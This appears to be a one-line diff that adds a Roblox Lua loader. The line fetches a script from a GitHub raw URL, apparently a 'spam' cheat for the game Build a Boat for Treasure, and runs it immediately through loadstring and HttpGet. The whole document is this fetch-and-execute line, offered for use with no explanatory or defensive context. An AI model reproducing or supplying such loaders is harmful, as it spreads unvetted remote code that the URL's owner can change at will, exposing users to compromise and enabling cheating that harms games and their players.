@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/build-a-boat-for-treasure-spam5-e2c870nqhf99ab.lua"))()
